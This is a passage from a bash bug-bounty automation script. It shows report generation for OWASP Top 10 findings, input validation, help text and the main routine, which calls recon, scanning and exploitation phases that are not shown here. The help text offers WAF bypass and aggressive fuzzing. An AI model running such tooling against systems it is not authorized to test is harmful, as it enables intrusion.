    sed -i "s/DOMAIN_PLACEHOLDER/$domain/g" "$json_file"
    sed -i "s/DATE_PLACEHOLDER/$(date)/g" "$json_file"
    sed -i "s/MODE_PLACEHOLDER/$SCAN_MODE/g" "$json_file"
    sed -i "s/DURATION_PLACEHOLDER/$duration/g" "$json_file"
    sed -i "s/TOTAL_PLACEHOLDER/${#VULNERABILITIES[@]}/g" "$json_file"
    sed -i "s/INJECTION_PLACEHOLDER/${VULNERABILITIES[injection]}/g" "$json_file"
    sed -i "s/BROKEN_AUTH_PLACEHOLDER/${VULNERABILITIES[broken_auth]}/g" "$json_file"
    sed -i "s/SENSITIVE_PLACEHOLDER/${VULNERABILITIES[sensitive_data]}/g" "$json_file"
    sed -i "s/XXE_PLACEHOLDER/${VULNERABILITIES[xml_external]}/g" "$json_file"
    sed -i "s/IDOR_PLACEHOLDER/${VULNERABILITIES[broken_access]}/g" "$json_file"
    sed -i "s/MISCONFIG_PLACEHOLDER/${VULNERABILITIES[security_misconfiguration]}/g" "$json_file"
    sed -i "s/XSS_PLACEHOLDER/${VULNERABILITIES[xss]}/g" "$json_file"
    sed -i "s/DESER_PLACEHOLDER/${VULNERABILITIES[insecure_deserialization]}/g" "$json_file"
    sed -i "s/COMPONENTS_PLACEHOLDER/${VULNERABILITIES[using_components_known_vuln]}/g" "$json_file"
    sed -i "s/LOGGING_PLACEHOLDER/${VULNERABILITIES[insufficient_logging]}/g" "$json_file"
    
    log SUCCESS "JSON report generated: $json_file"
}

generate_txt_report() {
    local domain=$1
    local txt_file="${OUTPUT_DIR}/REPORT.txt"
    
    local end_time=$(date +%s)
    local duration=$((end_time - START_TIME))
    
    cat > "$txt_file" << EOF
================================================================================
                    AWJUNAID SCRIPT ENGINE - SECURITY REPORT
================================================================================

EXECUTIVE SUMMARY
================================================================================
Domain:                     $domain
Scan Date:                  $(date)
Scan Mode:                  $SCAN_MODE
Total Scan Duration:        ${duration}s
Report Generated:           $(date '+%Y-%m-%d %H:%M:%S')

VULNERABILITY OVERVIEW
================================================================================
Total Vulnerabilities Found: $((${VULNERABILITIES[injection]} + ${VULNERABILITIES[broken_auth]} + ${VULNERABILITIES[sensitive_data]} + ${VULNERABILITIES[xml_external]} + ${VULNERABILITIES[broken_access]} + ${VULNERABILITIES[security_misconfiguration]} + ${VULNERABILITIES[xss]} + ${VULNERABILITIES[insecure_deserialization]} + ${VULNERABILITIES[using_components_known_vuln]} + ${VULNERABILITIES[insufficient_logging]}))

OWASP TOP 10 FINDINGS
================================================================================
[1] Injection:                           ${VULNERABILITIES[injection]} found
[2] Broken Authentication:               ${VULNERABILITIES[broken_auth]} found
[3] Sensitive Data Exposure:             ${VULNERABILITIES[sensitive_data]} found
[4] XML External Entities (XXE):         ${VULNERABILITIES[xml_external]} found
[5] Broken Access Control (IDOR):        ${VULNERABILITIES[broken_access]} found
[6] Security Misconfiguration:           ${VULNERABILITIES[security_misconfiguration]} found
[7] Cross-Site Scripting (XSS):          ${VULNERABILITIES[xss]} found
[8] Insecure Deserialization:            ${VULNERABILITIES[insecure_deserialization]} found
[9] Using Components with Known Vulns:   ${VULNERABILITIES[using_components_known_vuln]} found
[10] Insufficient Logging & Monitoring:  ${VULNERABILITIES[insufficient_logging]} found

DETAILED FINDINGS
================================================================================
See accompanying files:
- 01_recon.txt              (Reconnaissance phase results)
- 02_enumeration.txt        (Asset enumeration results)
- 03_scanning.txt           (Vulnerability scan results)
- 04_exploitation.txt       (Proof of concepts)
- REPORT.json               (Structured JSON report)
- REPORT.csv                (CSV format for spreadsheets)

REMEDIATION RECOMMENDATIONS
================================================================================
1. Implement Web Application Firewall (WAF)
   Priority: HIGH
   Estimated Effort: 2-4 weeks

2. Code Review & Secure Development Training
   Priority: HIGH
   Estimated Effort: Ongoing

3. Implement SAST in CI/CD Pipeline
   Priority: MEDIUM
   Estimated Effort: 1-2 weeks

4. Regular Security Audits
   Priority: MEDIUM
   Estimated Effort: Quarterly

5. Implement Runtime Security Monitoring
   Priority: MEDIUM
   Estimated Effort: 2-3 weeks

COMPLIANCE NOTES
================================================================================
- Tested for OWASP Top 10 2021
- Results may require manual verification
- Testing performed with authorization
- All results confidential and proprietary

DISCLAIMER
================================================================================
This report contains results of a security assessment. Findings should be
verified and remediated according to your organization's risk management
policies. Use this tool only on systems you own or have explicit permission
to test.

================================================================================
Report Generated by: AWJUNAID Script Engine v2.0
================================================================================
EOF
    
    log SUCCESS "TXT report generated: $txt_file"
}

generate_csv_report() {
    local domain=$1
    local csv_file="${OUTPUT_DIR}/REPORT.csv"
    
    cat > "$csv_file" << EOF
Vulnerability Type,Count,Severity,Status,Remediation
Injection,${VULNERABILITIES[injection]},High,Pending,Input validation & parameterized queries
Broken Authentication,${VULNERABILITIES[broken_auth]},High,Pending,MFA & strong password policies
Sensitive Data Exposure,${VULNERABILITIES[sensitive_data]},High,Pending,HTTPS & encryption
XML External Entities,${VULNERABILITIES[xml_external]},High,Pending,Disable XXE processing
Broken Access Control,${VULNERABILITIES[broken_access]},High,Pending,Implement proper access controls
Security Misconfiguration,${VULNERABILITIES[security_misconfiguration]},Medium,Pending,Hardening & CIS benchmarks
Cross-Site Scripting,${VULNERABILITIES[xss]},High,Pending,Output encoding & CSP
Insecure Deserialization,${VULNERABILITIES[insecure_deserialization]},High,Pending,Use safe deserialization libraries
Known Vulnerabilities,${VULNERABILITIES[using_components_known_vuln]},Medium,Pending,Update dependencies
Insufficient Logging,${VULNERABILITIES[insufficient_logging]},Medium,Pending,Implement audit logging
EOF
    
    log SUCCESS "CSV report generated: $csv_file"
}

generate_html_report() {
    local domain=$1
    local html_file="${OUTPUT_DIR}/REPORT.html"
    local end_time=$(date +%s)
    local duration=$((end_time - START_TIME))
    local total_vulns=$((${VULNERABILITIES[injection]} + ${VULNERABILITIES[broken_auth]} + ${VULNERABILITIES[sensitive_data]} + ${VULNERABILITIES[xml_external]} + ${VULNERABILITIES[broken_access]} + ${VULNERABILITIES[security_misconfiguration]} + ${VULNERABILITIES[xss]} + ${VULNERABILITIES[insecure_deserialization]} + ${VULNERABILITIES[using_components_known_vuln]} + ${VULNERABILITIES[insufficient_logging]}))
    
    cat > "$html_file" << 'EOFHTML'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AWJUNAID Security Report - DOMAIN_PLACEHOLDER</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #e0e0e0;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
            color: white;
            padding: 40px 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
        }
        
        .logo {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 10px;
            letter-spacing: 2px;
        }
        
        .scan-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .info-card {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 5px;
            backdrop-filter: blur(10px);
        }
        
        .info-label {
            font-size: 12px;
            text-transform: uppercase;
            opacity: 0.8;
        }
        
        .info-value {
            font-size: 20px;
            font-weight: bold;
            margin-top: 5px;
        }
        
        section {
            background: #16213e;
            padding: 30px;
            margin-bottom: 20px;
            border-radius: 10px;
            border-left: 5px solid #00d4ff;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        h2 {
            color: #00d4ff;
            margin-bottom: 20px;
            font-size: 24px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .vulnerability-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .vuln-item {
            background: linear-gradient(135deg, #2d3561 0%, #1f2a48 100%);
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #00d4ff;
            transition: transform 0.3s;
        }
        
        .vuln-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0, 212, 255, 0.2);
        }
        
        .vuln-name {
            font-weight: bold;
            color: #00d4ff;
            margin-bottom: 10px;
        }
        
        .vuln-count {
            font-size: 28px;
            font-weight: bold;
            color: #ffd700;
        }
        
        .severity-critical {
            border-left-color: #ff1744;
            background: linear-gradient(135deg, #5a2c2c 0%, #3d1f1f 100%);
        }
        
        .severity-high {
            border-left-color: #ff5722;
            background: linear-gradient(135deg, #5a3c2c 0%, #3d2a1f 100%);
        }
        
        .severity-medium {
            border-left-color: #ffc107;
            background: linear-gradient(135deg, #5a5030 0%, #3d3620 100%);
        }
        
        .severity-low {
            border-left-color: #4caf50;
            background: linear-gradient(135deg, #3c5a30 0%, #2a3d20 100%);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        
        th {
            background: #0f1624;
            color: #00d4ff;
            padding: 15px;
            text-align: left;
            font-weight: bold;
            border-bottom: 2px solid #00d4ff;
        }
        
        td {
            padding: 12px 15px;
            border-bottom: 1px solid #2d3561;
        }
        
        tr:hover {
            background: #2d3561;
        }
        
        .recommendations {
            background: linear-gradient(135deg, #1e3c3c 0%, #0f2424 100%);
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #4caf50;
        }
        
        .recommendation-item {
            padding: 15px;
            margin: 10px 0;
            background: rgba(76, 175, 80, 0.1);
            border-left: 4px solid #4caf50;
            border-radius: 4px;
        }
        
        .priority {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
        }
        
        .priority-high {
            background: #ff1744;
            color: white;
        }
        
        .priority-medium {
            background: #ff9800;
            color: white;
        }
        
        .priority-low {
            background: #4caf50;
            color: white;
        }
        
        footer {
            text-align: center;
            padding: 20px;
            color: #888;
            font-size: 12px;
            border-top: 1px solid #2d3561;
            margin-top: 40px;
        }
        
        .chart-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        
        .stat-box {
            background: #2d3561;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }
        
        .stat-number {
            font-size: 48px;
            font-weight: bold;
            color: #00d4ff;
        }
        
        .stat-label {
            color: #888;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">🛡️ AWJUNAID Security Report</div>
            <p>Professional Bug Bounty Assessment</p>
            
            <div class="scan-info">
                <div class="info-card">
                    <div class="info-label">Target Domain</div>
                    <div class="info-value">DOMAIN_PLACEHOLDER</div>
                </div>
                <div class="info-card">
                    <div class="info-label">Scan Mode</div>
                    <div class="info-value">MODE_PLACEHOLDER</div>
                </div>
                <div class="info-card">
                    <div class="info-label">Scan Date</div>
                    <div class="info-value">DATE_PLACEHOLDER</div>
                </div>
                <div class="info-card">
                    <div class="info-label">Duration</div>
                    <div class="info-value">DURATION_PLACEHOLDER</div>
                </div>
            </div>
        </header>
        
        <section>
            <h2>📊 Vulnerability Summary</h2>
            <div class="chart-container">
                <div class="stat-box">
                    <div class="stat-number" style="color: #ff1744;">TOTAL_PLACEHOLDER</div>
                    <div class="stat-label">Total Vulnerabilities</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" style="color: #ff5722;">HIGH_PLACEHOLDER</div>
                    <div class="stat-label">High Severity</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" style="color: #ffc107;">MEDIUM_PLACEHOLDER</div>
                    <div class="stat-label">Medium Severity</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" style="color: #4caf50;">LOW_PLACEHOLDER</div>
                    <div class="stat-label">Low Severity</div>
                </div>
            </div>
        </section>
        
        <section>
            <h2>🎯 OWASP Top 10 Findings</h2>
            <div class="vulnerability-grid">
                <div class="vuln-item severity-high">
                    <div class="vuln-name">[1] Injection</div>
                    <div class="vuln-count">INJECTION_PLACEHOLDER</div>
                </div>
                <div class="vuln-item severity-high">
                    <div class="vuln-name">[2] Broken Auth</div>
                    <div class="vuln-count">BROKEN_AUTH_PLACEHOLDER</div>
                </div>
                <div class="vuln-item severity-high">
                    <div class="vuln-name">[3] Data Exposure</div>
                    <div class="vuln-count">SENSITIVE_PLACEHOLDER</div>
                </div>
                <div class="vuln-item severity-high">
                    <div class="vuln-name">[4] XXE</div>
                    <div class="vuln-count">XXE_PLACEHOLDER</div>
                </div>
                <div class="vuln-item severity-high">
                    <div class="vuln-name">[5] IDOR</div>
                    <div class="vuln-count">IDOR_PLACEHOLDER</div>
                </div>
                <div class="vuln-item severity-medium">
                    <div class="vuln-name">[6] Misconfiguration</div>
                    <div class="vuln-count">MISCONFIG_PLACEHOLDER</div>
                </div>
                <div class="vuln-item severity-high">
                    <div class="vuln-name">[7] XSS</div>
                    <div class="vuln-count">XSS_PLACEHOLDER</div>
                </div>
                <div class="vuln-item severity-high">
                    <div class="vuln-name">[8] Deserialization</div>
                    <div class="vuln-count">DESER_PLACEHOLDER</div>
                </div>
                <div class="vuln-item severity-medium">
                    <div class="vuln-name">[9] Known Vulns</div>
                    <div class="vuln-count">COMPONENTS_PLACEHOLDER</div>
                </div>
                <div class="vuln-item severity-medium">
                    <div class="vuln-name">[10] Logging</div>
                    <div class="vuln-count">LOGGING_PLACEHOLDER</div>
                </div>
            </div>
        </section>
        
        <section>
            <h2>🔧 Detailed Findings</h2>
            <table>
                <thead>
                    <tr>
                        <th>Vulnerability Type</th>
                        <th>Severity</th>
                        <th>Count</th>
                        <th>Status</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>SQL Injection & Command Injection</td>
                        <td><span class="priority priority-high">HIGH</span></td>
                        <td>INJECTION_PLACEHOLDER</td>
                        <td>Pending Review</td>
                    </tr>
                    <tr>
                        <td>Broken Authentication</td>
                        <td><span class="priority priority-high">HIGH</span></td>
                        <td>BROKEN_AUTH_PLACEHOLDER</td>
                        <td>Pending Review</td>
                    </tr>
                    <tr>
                        <td>Sensitive Data Exposure</td>
                        <td><span class="priority priority-high">HIGH</span></td>
                        <td>SENSITIVE_PLACEHOLDER</td>
                        <td>Pending Review</td>
                    </tr>
                    <tr>
                        <td>Cross-Site Scripting</td>
                        <td><span class="priority priority-high">HIGH</span></td>
                        <td>XSS_PLACEHOLDER</td>
                        <td>Pending Review</td>
                    </tr>
                    <tr>
                        <td>Broken Access Control</td>
                        <td><span class="priority priority-high">HIGH</span></td>
                        <td>IDOR_PLACEHOLDER</td>
                        <td>Pending Review</td>
                    </tr>
                    <tr>
                        <td>Security Misconfiguration</td>
                        <td><span class="priority priority-medium">MEDIUM</span></td>
                        <td>MISCONFIG_PLACEHOLDER</td>
                        <td>Pending Review</td>
                    </tr>
                </tbody>
            </table>
        </section>
        
        <section>
            <h2>💡 Remediation Recommendations</h2>
            <div class="recommendation-item">
                <div style="margin-bottom: 10px;">
                    <span class="priority priority-high">HIGH</span>
                    <strong>Implement Web Application Firewall (WAF)</strong>
                </div>
                <p>Deploy a WAF such as ModSecurity, Cloudflare, or AWS WAF to protect against common attacks.</p>
                <p style="margin-top: 10px; color: #888; font-size: 12px;">Estimated Effort: 2-4 weeks</p>
            </div>
            
            <div class="recommendation-item">
                <div style="margin-bottom: 10px;">
                    <span class="priority priority-high">HIGH</span>
                    <strong>Input Validation & Output Encoding</strong>
                </div>
                <p>Implement parameterized queries, input validation, and proper output encoding to prevent injection attacks.</p>
                <p style="margin-top: 10px; color: #888; font-size: 12px;">Estimated Effort: 1-3 weeks</p>
            </div>
            
            <div class="recommendation-item">
                <div style="margin-bottom: 10px;">
                    <span class="priority priority-high">HIGH</span>
                    <strong>Enforce HTTPS & Encryption</strong>
                </div>
                <p>Ensure all traffic uses HTTPS with strong SSL/TLS configurations and encrypt sensitive data at rest.</p>
                <p style="margin-top: 10px; color: #888; font-size: 12px;">Estimated Effort: 1-2 weeks</p>
            </div>
            
            <div class="recommendation-item">
                <div style="margin-bottom: 10px;">
                    <span class="priority priority-medium">MEDIUM</span>
                    <strong>Security Code Review & Training</strong>
                </div>
                <p>Conduct regular security code reviews and provide developer training on secure coding practices.</p>
                <p style="margin-top: 10px; color: #888; font-size: 12px;">Estimated Effort: Ongoing</p>
            </div>
            
            <div class="recommendation-item">
                <div style="margin-bottom: 10px;">
                    <span class="priority priority-medium">MEDIUM</span>
                    <strong>Update Dependencies & Components</strong>
                </div>
                <p>Keep all libraries, frameworks, and dependencies up to date with the latest security patches.</p>
                <p style="margin-top: 10px; color: #888; font-size: 12px;">Estimated Effort: 1-2 weeks</p>
            </div>
        </section>
        
        <section>
            <h2>📋 Report Details</h2>
            <table>
                <tr>
                    <td><strong>Report Type:</strong></td>
                    <td>Comprehensive Security Assessment</td>
                </tr>
                <tr>
                    <td><strong>Assessment Scope:</strong></td>
                    <td>OWASP Top 10 2021</td>
                </tr>
                <tr>
                    <td><strong>Tools Used:</strong></td>
                    <td>AWJUNAID Engine v2.0, Nuclei, Dalfox, Nmap</td>
                </tr>
                <tr>
                    <td><strong>Methodology:</strong></td>
                    <td>Reconnaissance → Enumeration → Scanning → Exploitation → Reporting</td>
                </tr>
            </table>
        </section>
        
        <footer>
            <p>This report contains confidential security assessment information. Unauthorized distribution is prohibited.</p>
            <p>Generated by AWJUNAID Script Engine v2.0 | © 2026 AWJUNAID Development Team</p>
            <p>For questions or clarifications, please contact the security team.</p>
        </footer>
    </div>
</body>
</html>
EOFHTML
    
    # Replace placeholders
    sed -i "s/DOMAIN_PLACEHOLDER/$domain/g" "$html_file"
    sed -i "s/MODE_PLACEHOLDER/$SCAN_MODE/g" "$html_file"
    sed -i "s/DATE_PLACEHOLDER/$(date)/g" "$html_file"
    sed -i "s/DURATION_PLACEHOLDER/${duration}s/g" "$html_file"
    sed -i "s/TOTAL_PLACEHOLDER/$total_vulns/g" "$html_file"
    sed -i "s/HIGH_PLACEHOLDER/$((${VULNERABILITIES[injection]} + ${VULNERABILITIES[xss]} + ${VULNERABILITIES[xml_external]} + ${VULNERABILITIES[broken_access]}))/g" "$html_file"
    sed -i "s/MEDIUM_PLACEHOLDER/$((${VULNERABILITIES[security_misconfiguration]} + ${VULNERABILITIES[using_components_known_vuln]}))/g" "$html_file"
    sed -i "s/LOW_PLACEHOLDER/$((${VULNERABILITIES[insufficient_logging]}))/g" "$html_file"
    sed -i "s/INJECTION_PLACEHOLDER/${VULNERABILITIES[injection]}/g" "$html_file"
    sed -i "s/BROKEN_AUTH_PLACEHOLDER/${VULNERABILITIES[broken_auth]}/g" "$html_file"
    sed -i "s/SENSITIVE_PLACEHOLDER/${VULNERABILITIES[sensitive_data]}/g" "$html_file"
    sed -i "s/XXE_PLACEHOLDER/${VULNERABILITIES[xml_external]}/g" "$html_file"
    sed -i "s/IDOR_PLACEHOLDER/${VULNERABILITIES[broken_access]}/g" "$html_file"
    sed -i "s/MISCONFIG_PLACEHOLDER/${VULNERABILITIES[security_misconfiguration]}/g" "$html_file"
    sed -i "s/XSS_PLACEHOLDER/${VULNERABILITIES[xss]}/g" "$html_file"
    sed -i "s/DESER_PLACEHOLDER/${VULNERABILITIES[insecure_deserialization]}/g" "$html_file"
    sed -i "s/COMPONENTS_PLACEHOLDER/${VULNERABILITIES[using_components_known_vuln]}/g" "$html_file"
    sed -i "s/LOGGING_PLACEHOLDER/${VULNERABILITIES[insufficient_logging]}/g" "$html_file"
    
    log SUCCESS "HTML report generated: $html_file"
}

################################################################################
# HELPER FUNCTIONS
################################################################################

validate_domain() {
    local domain=$1
    
    if [[ -z "$domain" ]]; then
        log ERROR "Domain cannot be empty"
        return 1
    fi
    
    if ! [[ "$domain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$ ]]; then
        log ERROR "Invalid domain format: $domain"
        return 1
    fi
    
    return 0
}

validate_scan_mode() {
    local mode=$1
    
    case $mode in
        soft|medium|hard)
            return 0
            ;;
        *)
            log ERROR "Invalid scan mode: $mode (use: soft, medium, hard)"
            return 1
            ;;
    esac
}

print_help() {
    cat << EOF
${CYAN}AWJUNAID Script Engine v2.0${NC} - Bug Bounty Automation Framework

${GREEN}Usage:${NC}
  $0 -d <domain> [OPTIONS]

${GREEN}Required Arguments:${NC}
  -d, --domain <domain>          Target domain to scan (e.g., example.com)

${GREEN}Optional Arguments:${NC}
  -m, --mode <mode>              Scan mode: soft (default), medium, hard
  -t, --threads <number>         Number of threads (default: 10)
  --timeout <seconds>            Request timeout in seconds (default: 30)
  -r, --rate-limit <req/sec>     Rate limit in requests per second
  --waf-bypass                   Enable WAF bypass techniques
  --retry <number>               Number of retry attempts (default: 3)
  -v, --verbose                  Verbose output
  -h, --help                     Show this help message

${GREEN}Examples:${NC}
  # Soft scan (passive reconnaissance only)
  $0 -d example.com -m soft

  # Medium scan with custom threads
  $0 -d example.com -m medium -t 20

  # Hard scan with aggressive fuzzing and WAF bypass
  $0 -d example.com -m hard --waf-bypass

  # Verbose scan with rate limiting
  $0 -d example.com -m medium -v --rate-limit 5

${GREEN}Scan Modes:${NC}
  soft    (5-10 min)   - Passive reconnaissance, no active probing
  medium  (15-30 min)  - Vulnerability scanning with Nuclei/Dalfox
  hard    (1-2+ hours) - Aggressive fuzzing, directory brute force, JS analysis

${GREEN}Output:${NC}
  All reports are saved in:
  ./reports/[domain]_[timestamp]/

  Generated files:
  - REPORT.html    (Beautiful HTML dashboard)
  - REPORT.json    (Structured JSON format)
  - REPORT.txt     (Executive summary)
  - REPORT.csv     (Spreadsheet format)
  - 01_recon.txt   (Reconnaissance details)
  - 02_enumeration.txt (Asset enumeration)
  - 03_scanning.txt    (Vulnerability findings)
  - 04_exploitation.txt (PoC generation)
  - scan.log       (Detailed execution log)

${GREEN}Advanced Features:${NC}
  ✓ 5-Phase Automated Workflow
  ✓ OWASP Top 10 Coverage
  ✓ Multi-source Subdomain Enumeration
  ✓ Live Host Detection
  ✓ Technology Stack Detection
  ✓ Vulnerability Exploitation
  ✓ Automated PoC Generation
  ✓ Rate Limiting & WAF Bypass
  ✓ Comprehensive Reporting
  ✓ Multi-threaded Scanning

${GREEN}Requirements:${NC}
  - Bash 4.0+
  - curl, dig, nmap
  - Optional: subfinder, amass, nuclei, dalfox, whatweb, ffuf

${GREEN}Disclaimer:${NC}
  Use this tool only on systems you own or have explicit permission to test.
  Unauthorized access to computer systems is illegal.

EOF
}

print_summary() {
    local domain=$1
    local end_time=$(date +%s)
    local duration=$((end_time - START_TIME))
    local minutes=$((duration / 60))
    local seconds=$((duration % 60))
    
    echo ""
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC}              ${GREEN}✓ AWJUNAID SCAN COMPLETED${NC}${CYAN}                      ║${NC}"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC} Target Domain:    ${WHITE}$domain${NC}${CYAN}          ║${NC}"
    echo -e "${CYAN}║${NC} Scan Mode:        ${WHITE}$SCAN_MODE${NC}${CYAN}              ║${NC}"
    echo -e "${CYAN}║${NC} Total Duration:   ${WHITE}${minutes}m ${seconds}s${NC}${CYAN}                    ║${NC}"
    echo -e "${CYAN}║${NC} Vulnerabilities:  ${RED}${VULNERABILITIES[injection]} ${VULNERABILITIES[xss]}${NC}${CYAN}                    ║${NC}"
    echo -e "${CYAN}║${NC} Report Location:  ${WHITE}$OUTPUT_DIR${NC}${CYAN} ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${GREEN}Reports Generated:${NC}"
    echo "  📊 REPORT.html       - Interactive HTML dashboard"
    echo "  📋 REPORT.txt        - Executive summary"
    echo "  📈 REPORT.json       - Structured JSON data"
    echo "  📑 REPORT.csv        - Spreadsheet format"
    echo "  🔍 01_recon.txt      - Reconnaissance phase"
    echo "  🔗 02_enumeration.txt - Asset enumeration"
    echo "  🛡️  03_scanning.txt   - Vulnerability scan results"
    echo "  💥 04_exploitation.txt - PoC and validation"
    echo ""
}

################################################################################
# MAIN EXECUTION
################################################################################

main() {
    print_banner
    
    # Parse arguments
    if [[ $# -eq 0 ]]; then
        print_help
        exit 1
    fi
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -d|--domain)
                DOMAIN="$2"
                shift 2
                ;;
            -m|--mode)
                SCAN_MODE="$2"
                shift 2
                ;;
            -t|--threads)
                THREADS="$2"
                shift 2
                ;;
            --timeout)
                TIMEOUT="$2"
                shift 2
                ;;
            -r|--rate-limit)
                RATE_LIMIT="$2"
                shift 2
                ;;
            --waf-bypass)
                WAF_BYPASS=1
                shift
                ;;
            --retry)
                RETRY_ATTEMPTS="$2"
                shift 2
                ;;
            -v|--verbose)
                VERBOSE=1
                shift
                ;;
            -h|--help)
                print_help
                exit 0
                ;;
            *)
                log ERROR "Unknown option: $1"
                print_help
                exit 1
                ;;
        esac
    done
    
    # Validate inputs
    if ! validate_domain "$DOMAIN"; then
        exit 1
    fi
    
    if ! validate_scan_mode "$SCAN_MODE"; then
        exit 1
    fi
    
    # Initialize
    init_logging "$DOMAIN"
    
    log SUCCESS "AWJUNAID Script Engine v2.0 initialized"
    log INFO "Domain: $DOMAIN | Mode: $SCAN_MODE | Threads: $THREADS"
    log INFO "Logs: $LOG_FILE"
    
    # Execute 5-phase workflow
    recon_phase "$DOMAIN"
    enumeration_phase "$DOMAIN"
    scanning_phase "$DOMAIN"
    exploitation_phase "$DOMAIN"
    reporting_phase "$DOMAIN"
    
    # Print summary
    print_summary "$DOMAIN"
    
    log SUCCESS "Scan completed successfully!"
}

# Execute main function
main "$@"

################################################################################
# END OF AWJUNAID SCRIPT ENGINE
################################################################################
